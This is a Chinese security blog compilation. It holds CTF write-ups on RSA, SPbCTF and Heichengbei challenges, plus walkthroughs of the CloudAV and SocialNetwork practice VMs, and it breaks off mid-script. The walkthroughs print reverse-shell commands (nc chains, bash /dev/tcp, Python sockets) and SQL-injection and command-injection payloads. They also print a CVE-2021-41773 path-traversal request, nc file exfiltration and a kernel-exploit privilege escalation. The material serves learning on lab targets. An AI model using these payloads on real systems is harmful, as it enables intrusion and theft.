332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323 c = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242 三组n和c，联想到中国剩余定理，再仔细观察可以发现n和c的值都没有超过5，它们都是五进制的数，这里需要进行进制的转换。题目没有给出加密指数e，但是根据低加密指数广播攻击的特性猜e=3、10、17等，也可进行遍历。 m\u003csup\u003ee\u003c/sup\u003e = c\u003csub\u003e1\u003c/sub\u003e (mod n\u003csub\u003e1\u003c/sub\u003e)\rm\u003csup\u003ee\u003c/sup\u003e = c\u003csub\u003e2 \u003c/sub\u003e(mod n\u003csub\u003e2\u003c/sub\u003e)\rm\u003csup\u003ee\u003c/sup\u003e = c\u003csub\u003e3 \u003c/sub\u003e(mod n\u003csub\u003e3\u003c/sub\u003e)\r在e=3时，可以得到：\rc\u003csub\u003ex\u003c/sub\u003e=m\u003csup\u003e3\u003c/sup\u003e mod n\u003csub\u003e1\u003c/sub\u003en\u003csub\u003e2\u003c/sub\u003en\u003csub\u003e3\u003c/sub\u003e\r通过对c\u003csub\u003ex\u003c/sub\u003e进行三次开方可以求得明文。\r代码如下 import gmpy2\rimport binascii\r#利用中国剩余定理求解同余方程，aList：余数，mList：模数\rdef CRT(aList, mList):\rM = 1\rfor i in mList:\rM = M * i #计算M = ∏ mi\r#print(M)\rx = 0\rfor i in range(len(mList)):\rMi = M // mList[i] #计算Mi\rMi_inverse = gmpy2.invert(Mi, mList[i]) #计算Mi的逆元\rx += aList[i] * Mi * Mi_inverse #构造x各项\rx = x % M\rreturn x\rif __name__ == \"__main__\":\rguess = [3,10,17] cList = [int(c1,5), int(c2,5), int(c3,5)]\rnList = [int(n1,5), int(n2,5), int(n3,5)]\rm_e = CRT(cList, nList) #计算m^e\rfor e in guess: #遍历e求解\rm, f = gmpy2.iroot(m_e, e) #m_e开e次根\rprint(\"加密指数e = %d：\"%e)\rm = hex(m)[2:]\rif len(m)%2 == 1:\rm = m + '0' #binascii.unhexlify()参数长度必须为偶数，因此做一下处理\rflag = binascii.unhexlify(m)\rprint(flag)\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:9:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x09 [HDCTF2019]bbbbbbrsa enc如下 p = 177077389675257695042507998165006460849 n = 37421829509887796274897162249367329400988647145613325367337968063341372726061 c = ==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3Mj 能看出c是base64翻转的字符串，使用python的base64.b64decode(str[::-1])得到c的值为2373740699529364991763589324200093466206785561836101840381622237225512234632 encode.py如下 from base64 import b64encode as b32encode\rfrom gmpy2 import invert,gcd,iroot\rfrom Crypto.Util.number import *\rfrom binascii import a2b_hex,b2a_hex\rimport random\rflag = \"******************************\"\rnbit = 128\rp = getPrime(nbit)\rq = getPrime(nbit)\rn = p*q\rprint p\rprint n\rphi = (p-1)*(q-1)\re = random.randint(50000,70000)\rwhile True:\rif gcd(e,phi) == 1:\rbreak;\relse:\re -= 1;\rc = pow(int(b2a_hex(flag),16),e,n)\rprint b32encode(str(c))[::-1]\r# 2373740699529364991763589324200093466206785561836101840381622237225512234632\r发现竟然直接把c给出了，下面就只需要在50000到70000之间爆破出e的值即可。代码如下 import gmpy2\rfrom Crypto.Util.number import *\rq = n//p\rphi = (p-1)*(q-1)\rfor e in range(50000,70000):\rif(gmpy2.gcd(e,phi)==1):\rd = gmpy2.invert(e,phi)\rm = pow(c,d,n)\rif 'flag' in str(long_to_bytes(m)):\rflag = long_to_bytes(m)\rprint (flag)\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:10:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x0A [BJDCTF2020]RSA from Crypto.Util.number import getPrime,bytes_to_long flag=open(\"flag\",\"rb\").read() p=getPrime(1024) q=getPrime(1024) assert(e\u003c100000) n=p*q m=bytes_to_long(flag) c=pow(m,e,n) print c,n print pow(294,e,n) p=getPrime(1024) n=p*q m=bytes_to_long(\"BJD\"*32) c=pow(m,e,n) print c,n ''' output: 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 ''' 由于e小于100000且存在 pow(294,e,n) 的表达式，可以爆破求出其值，两个n值公用了一个q，可以通过gcd函数很快找到q的值。代码如下 import gmpy2\rfrom Crypto.Util.number import *\rfor e in range(100000):\rres = pow(294,e,n1)\rif (res == output):\rbreak p = gmpy2.gcd(n1,n2)\rq1 = n1//p\rphi1 = (p-1)*(q1-1)\rd = gmpy2.invert(e,phi1)\rm = pow(c1,d,n1)\rflag = long_to_bytes(m)\rprint(flag) ","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:11:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"\r","date":"2021-10-11","objectID":"/2021-10-11-spbctf-2021-writeup/:0:0","tags":["CTF"],"title":"SPbCTF 2021 WriteUp","uri":"/2021-10-11-spbctf-2021-writeup/"},{"categories":["WriteUp"],"content":"0x00 前言 国外的比赛题型很新颖，换句话说，也挺花里胡哨的，不过太菜了，只解出了easy的题目，555，摸鱼打一打。 ","date":"2021-10-11","objectID":"/2021-10-11-spbctf-2021-writeup/:1:0","tags":["CTF"],"title":"SPbCTF 2021 WriteUp","uri":"/2021-10-11-spbctf-2021-writeup/"},{"categories":["WriteUp"],"content":"0x01 CatStep 题目 Greeting human! We want to play a game with you. The mission is simple: you need to guess our flag, that’s all. We use an algorithm to determine the similarity of strings. 需要在这个页面以POST的方式传递一个flag的值，然后系统会根据莱文斯坦距离来计算所提交的flag与真实flag的相似度。 bp抓包后，提交一个空值，提示flag至少要8位。 再构造超长的确定flag的最大位数。 为了判断flag长度的精确值，构造flag值为特殊字符，得到的length即为真实flag的长度。 然后使用inturder模块来逐位爆破，字典定义为a-z、A-Z、一些特殊字符，每一位正确length的长度就会减一，而且必定是spbctf{………}格式的 。经过几轮的爆破得到spbctf{asy_webfgzc}。这个显然不是最终的结果，它表明了flag包含这些字符且前后顺序是相同的，那就可以把position插入到{}里面，逐个慢慢爆破，最后得到正确的flag为spbctf{easy_web_fuzzing_0t5AFzSG0Oc} ","date":"2021-10-11","objectID":"/2021-10-11-spbctf-2021-writeup/:2:0","tags":["CTF"],"title":"SPbCTF 2021 WriteUp","uri":"/2021-10-11-spbctf-2021-writeup/"},{"categories":["WriteUp"],"content":"0x02 BLT 题目 Our company provides services for the development of the most modern software.\rCan you check our landing page for vulnerabilities?\rHere's our website: 164.90.201.196:8080/\rAnd here's our infrastructure: blt.zip\r扫描一下目录，发现有.git泄露，不过用GitHack下不下来东西。 在压缩包的dockerfile文件中发现一个可疑的操作。 到这里就没思路了，后来，听大佬说是用一个新出的apache的CVE-2021-41773来打。这里抓包用poc访问下/etc/passwd ip/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\r可以！接着知道了flag的路径，直接访问它，得到spbctf{th3_lat3st_d03s_n0t_m3an_s3cur3} ","date":"2021-10-11","objectID":"/2021-10-11-spbctf-2021-writeup/:3:0","tags":["CTF"],"title":"SPbCTF 2021 WriteUp","uri":"/2021-10-11-spbctf-2021-writeup/"},{"categories":["WriteUp"],"content":"0x03 Cook Admin 头一次做OSINT的题目，还挺有意思的，题目如下 A website has appeared on the Internet that promises free cookies to everyone. However, no matter how many times you visit it, you will not see any cookies. Expose this gang that gives you empty promises. You will need to find the following people (‘to find’ means to obtain the email address of each of the three persons). The administrator and owner of the fraudulent website The courier who published a sample set of cookie pictures The programmer who developed this website (he is a huge fan of birds and his email is on the website domain) Website: freecookiesforeverybody.xyz/ Submit here the administrator’s email. ok，先访问提供的域名看看，查看源码也并没有什么有用的信息。 跳转后来到谷歌云盘，里面是一些曲奇的图片。这时突然想到，whois查询域名或许能够发现邮箱信息。访问https://who.is/，输入域名，得到flag，spbctf{helen.m.clifford@mail.ru}。 ","date":"2021-10-11","objectID":"/2021-10-11-spbctf-2021-writeup/:4:0","tags":["CTF"],"title":"SPbCTF 2021 WriteUp","uri":"/2021-10-11-spbctf-2021-writeup/"},{"categories":["安全技术"],"content":"\r","date":"2021-10-10","objectID":"/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/:0:0","tags":null,"title":"打靶-CloudAV","uri":"/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/"},{"categories":["安全技术"],"content":"0x00 描述 云反病毒扫描器！是一种基于云的防病毒扫描服务。 目前，它处于测试模式。您被要求测试设置并查找漏洞并升级权限。 难度：容易 涉及的任务： 端口扫描 网络应用程序攻击 sql注入 命令注入 蛮力 代码分析 ","date":"2021-10-10","objectID":"/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/:1:0","tags":null,"title":"打靶-CloudAV","uri":"/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/"},{"categories":["安全技术"],"content":"0x01 正式打靶 使用arping来进行主机发现，arping的适用性优于arp-scan，默认安装在linux系统中，arp-scan则是作为一种渗透测试的工具。缺点是无法对一段ip地址进行统一的主机发现，需要与shell脚本结合一下。使用for i in $(seq 1 254);do sudo arping -c 2 10.0.2.$i;done，-c：发送指定的count个ARP REQUEST包后停止。 对主机进行端口扫描。 访问web服务，这里有两种攻击思路，通过SQL注入绕过登录和暴力破解。 使用bp的intruder进行fuzz测试，把键盘上所有的特殊符号作为字典，因为在任何的语言中，键盘上的符号都有特殊的功能，如果存在注入漏洞，当注入特殊符号的时候，就会触发服务器端代码上的问题，造成语法语义上的歧义，从而使服务器无法处理请求，从而发现漏洞，通过触发漏洞，可以找到可能存在的注入漏洞。 返回200代表返回的是错误的信息，而双引号是触发了sqlite的报错。 接着往下看，发现密码是SQL语句拼接的。 构造payload为\" or 1=1 --，这样整个sql语句就是select * from code where password=\"\" or 1=1 --\"，Redirecting to /scan 这里可以指定文件名提交给服务器进行云查杀，这里可以猜想，当我们提交某个文件之后，服务器也是会调用某个命令进行操作，比如：avscan hello，那就意味着能够进行命令执行。测试一下hello|ls（这里一直出不了结果，后来发现靶机比较玄学，太搞心态了。。。，吃完饭回来发现才ok了） 在Linux上通常会使用nc进行网络连接，来查看一下nc命令是否存在：hello | which nc，返回结果为/bin/nc，构造nc -e /bin/sh 10.0.2.4 2333来反弹shell，-e prog 程序重定向，一旦连接，就执行。但是侦听端口并没有返回信息，这里怀疑靶机linux发行版的nc不支持-e这个参数。下面使用nc的串联，这样，连接2333后，在2333输入的指令，都会通过管道符在/bin/bash下解析，再把执行的结果返回到8888端口。 hello| nc 10.0.2.4 2333 | /bin/bash | nc 10.0.2.4 8888\r发现可疑文件database.sql，应该是Web应用程序的数据库，执行file命令。 用nc命令把文件下载下来进行查看。 本地：nc -nvlp 9999 \u003e db.sql\r靶机：nc 10.0.2.4 9999 \u003c database.sql\r发现存储有密码信息。 再利用cat /etc/passwd | grep /bin/bash找出有shell权限的用户，构造用户名和密码的字典，然后使用hydra对ssh进行爆破。hydra -L user.txt -P pass.txt ssh://10.0.2.6，结果失败了。 再次进行信息搜集，在上级目录下发现可疑文件，属主是root，看名字应该是进行avscan的。 C语言文件应该就是源码，这里查看一下。 这里可以构造参数拼接反弹shell的命令进去 ./update_cloudav \"a | nc 10.0.2.4 1111 | /bin/bash | nc 10.0.2.4 2222\"\r还有更简单的方法，参照http://www.maidang.cool/2021/54528.html。 ./update_cloudav \"a;echo 'bash -i \u003e\u0026 /dev/tcp/10.0.2.4/5555 0\u003e\u00261' | bash\"\r","date":"2021-10-10","objectID":"/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/:2:0","tags":null,"title":"打靶-CloudAV","uri":"/2021-10-10-%E6%89%93%E9%9D%B6-cloudav/"},{"categories":["安全技术"],"content":"\r","date":"2021-10-09","objectID":"/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/:0:0","tags":["渗透测试","Web安全"],"title":"打靶-SocialNetwork","uri":"/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/"},{"categories":["安全技术"],"content":"0x00 准备工作 中等难度的靶机，Description如下： Leave a message is a new anonymous social networking site where users can post messages for each other. They've assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though. 直接装在vmware上即可。 ","date":"2021-10-09","objectID":"/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-SocialNetwork","uri":"/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/"},{"categories":["安全技术"],"content":"0x01 正式打靶 上nmap扫描主机的端口，发现开放了22和5000。 再深入扫描一下服务，发现5000端口使用了Werkzeug。 baidu一下，发现Werkzeug是作为一个Python Web框架的底层库。 访问下5000端口，发现存在一个留言板。 使用dirsearch来进行路径发现，发现存在一个隐藏的admin路径，接下来访问它。 好家伙，这个页面可以直接进行代码执行。 这里插一个小细节，之前扫描出web服务的编程语言是python，所以这里可以通过python的代码执行来反弹shell。 应用的代码如下： import socket,subprocess,os\rs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((\"192.168.92.129\",2333))\ros.dup2(s.fileno(),0)\ros.dup2(s.fileno(),1)\ros.dup2(s.fileno(),2)\rp=subprocess.call([\"/bin/bash\",\"-i\"])\r本地开2333端口侦听，执行id命令后，能看到是root用户，不过当前目录下的dockerfile很可疑，可能进入的系统是docker容器的系统。 确定进入的系统是否为docker系统的方法： ls /.dockerenv，查看根目录下是否存在有.dockerenv文件 cat /proc/1/cgroup ，1代表初始化进程的id，当它的cgroup文件中包含docker文件的映像信息和哈希值，就100%确定工作在docker环境 查看当前ip，然后在内网进行主机发现，当前172.17.0.2/16是b段，全部ping的话，主机数目过多。 这里利用一个小脚本for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done，可以看到1-3主机是存活的。 然后使用Venom工具，./admin_linux_x64 -lport 8888，侦听8888端口，再用python3 -m http.server 80开启web服务，用靶机wget下载agent_linux_x64。 kali上面会得到结点响应，再开启socks5代理。 使用proxychains nmap -sT -Pn 172.17.0.1,扫描172.17.0.1的端口。 再次详细扫描proxychains nmap -p22,5000 -sV -sT -Pn 172.17.0.1，不能说是一模一样，只能说是完全一致。 然后在浏览器部署代理后访问页面。 似曾相识燕归来，根据他们相同的内容，可以做出判断，这所谓的两台主机其实是同一台主机，只不过一个对应内网ip，一个对应外网ip。 好了，下面就朝着172.17.0.3猛攻，扫描它的端口。 开启了9200端口，在详细扫描一下，可以发现是Elasticsearch服务。 web访问，得到版本信息。 利用searchsploit elasticsearch找一下历史漏洞。 使用cp /usr/share/exploitdb/exploits/linux/remote/36337.py .拷贝到当前目录下，简单查看下代码。 使用proxychains python2 36337.py 172.17.0.3来getshell，发现获取到的还是root权限。 在当前目录查看，发现一个passwords文件，查看一下。 文件的格式貌似是用户名和密码的哈希值，在线解密汇总。 john:1337hack\rtest:1234test\radmin:1111pass\rroot:1234pass\rjane:1234jane\r经过尝试ssh连接，只有john用户可以登录到192.168.92.134上。 查看john的权限，发现并不能够直接sudo。 下面尝试本地提权，最主要的一种方法是通过内核漏洞提权，查看下当前的版本。 再利用searchsploit查找下。 拷贝到当前目录，cp /usr/share/exploitdb/exploits/linux/local/37292.c .，这个明显是c语言写的，但是靶机上运行不了gcc，无法编译。 阅读代码发现，代码运行中会再次调用gcc命令将.c文件编译成.so文件。 对源代码进行修改，删除掉143-147行内容。 使用gcc -o exp 37292.c进行编译，编译过程中会报错，但是并不影响。 使用locate命令用于查找符合条件的文件，同样拷贝到当前目录下，再用python启动web服务。 用靶机wget下载exp和ofs-lib.so。 然后把两个文件移到tmp文件夹，再修改exp的权限后执行。 最后，提权成功！ ","date":"2021-10-09","objectID":"/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-SocialNetwork","uri":"/2021-10-09-%E6%89%93%E9%9D%B6-socialnetwork/"},{"categories":["WriteUp"],"content":"\r","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:0:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x00 MISC 流量分析 打开timu.pcapng，发现有明显的sql注入痕迹。 追踪tcp流，不断点击跳转，找不同，在第70个流时，发现返回了You are in 的信息，猜想应该是sql注入的猜解成功了。 过滤一下are字符串，顺着找出其他返回成功的ascii码值 最后得到102 108 97 103 123 119 49 114 101 115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125，解出flag{w1reshARK_ez_1sntit} ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:1:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x01 MISC NEW_MISC 打开pdf，法语，看起来像是在说隐写术。 对于pdf的隐写题，先直接上wbs43open 将解密结果导出到1.txt，即可得到flag{verY_g00d_YoU_f0und_th1s}。 ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:2:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x02 CRYPTO EASY_ CRYPTO 给了一个文本，很明显是核心价值观编码。 公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和谐公正平等敬业公正敬业自由敬业平等自由法治和谐平等文明自由诚信自由平等富强公正敬业平等民主公正诚信和谐公正文明公正爱国自由诚信自由平等文明公正诚信富强自由法治法治平等平等自由平等富强法治诚信和谐 在https://www.amanctf.com/tool/cvecode解一下，得到flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}。 ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:3:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x03 MISC A_MISC 压缩包加了密，随便爆破一下，解出qwer 得到一张不全的图 怀疑存在高度隐写，改一下高度，出现完整的信息. 是一个file.pcap，下载下来分析一下，发现里面有盲注的痕迹。 url解密一下就能看得更清楚一些。 最后获取的acsii码值为102 108 97 103 123 99 100 50 99 51 101 50 102 101 97 52 54 51 100 101 100 57 97 102 56 48 48 100 55 49 53 53 98 101 55 97 113 125，得出flag{cd2c3e2fea463ded9af800d7155be7aq} ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:4:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x04 CRYPTO A_ CRYPTO 题目如下： 4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35 存在Q、N、R等字母，需要编码转换到A-F，这里采用Rot13解密。放到Cyberchef里面。直接帮着转了hex、base32、base64。 然后再转一下base85，注意要更换下字母表，最后得到flag{W0w_y0u_c4n_rea11y_enc0d1ng!} ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:5:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x05 MISC MISC_2 给了一张猫片，丢到Stegsolve里面查看，发现存在LSB隐写。 保存一下，提取出来，HTML实体编码为 flag{h0w_4bouT_enc0de_ 4nd_pnG}\r转换下得到flag{h0w_4bouT_enc0de_ 4nd_pnG}。 ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:6:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x06 CRYPTO BABYRSA from Crypto.Util.number import getPrime, bytes_to_long\rfrom secret import flag\rp = getPrime(1024)\rq = getPrime(1024)\rn = p * q\re = 65537\rhint1 = p \u003e\u003e 724\rhint2 = q % (2 ** 265)\rct = pow(bytes_to_long(flag), e, n)\rprint(hint1)\rprint(hint2)\rprint(n)\rprint(ct)\rout.txt如下： 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479 40812438243894343296354573724131194431453023461572200856406939246297219541329623 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969 19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188 原题，参考：http://www.zbc53.top/archives/148/ 脚本 from gmpy2 import * from Crypto.Util.number import * p1 = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479 q0 = 40812438243894343296354573724131194431453023461572200856406939246297219541329623 n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969 mod=pow(2,265) p0=n*invert(q0,mod)%mod pbar=(p1\u003c\u003c724)+p0 PR.\u003cx\u003e = PolynomialRing(Zmod(n)) for i in range(32): f=pbar+x*mod*32 f=f.monic() pp=f.small_roots(X=2^454,beta=0.4) if(pp): break pbar+=mod p=pbar+pp[0]*32*mod assert n%p==0 print(p) q=n//p phi=(p-1)*(q-1) e=65537 d=invert(e,phi) c=19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188 m=pow(c,d,n) print(long_to_bytes(m)) #flag{ef5e1582-8116-4f61-b458-f793dc03f2ff} ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:7:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x07 CRYPTO CRAZY_RSA_TECH from Crypto.Util.number import *\rfrom Crypto.Util.Padding import *\rFLAG = bytes_to_long(pad(b\"flag{??????}\",64))\rdef init_key():\rp, q = getPrime(512), getPrime(512)\rn = p*q\re = 9\rwhile(GCD((p-1)*(q-1),e)!=1):\rp, q = getPrime(512), getPrime(512)\rn = p*q\rd = inverse(e,(p-1)*(q-1))\rreturn n,e,d\rn_list=list()\rc_list=list()\rfor i in range(9):\rN,e,d=init_key()\rn_list.append(N)\rc=pow(FLAG,e,N)\rc_list.append(pow(FLAG,e,N))\rassert(pow(c,d,N)==FLAG)\rprint(\"n_list:\",n_list)\rprint(\"c_list:\",c_list)\r给出了9个n_list和c_list的值，e很小，属于低加密指数广播攻击。 脚本如下： from struct import pack,unpack import zlib import gmpy def my_parse_number(number): string = \"%x\" % number erg = [] while string != '': erg = erg + [chr(int(string[:2], 16))] string = string[2:] return ''.join(erg) def extended_gcd(a, b): x,y = 0, 1 lastx, lasty = 1, 0 while b: a, (q, b) = b, divmod(a,b) x, lastx = lastx-q*x, x y, lasty = lasty-q*y, y return (lastx, lasty, a) def chinese_remainder_theorem(items): N = 1 for a, n in items: N *= n result = 0 for a, n in items: m = N//n r, s, d = extended_gcd(n, m) if d != 1: N=N//n continue result += a*s*m return result % N, N sessions=[ {\"c\":62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585, \"e\": 9, \"n\":71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799}, {\"c\":46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900, \"e\": 9, \"n\":92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949}, 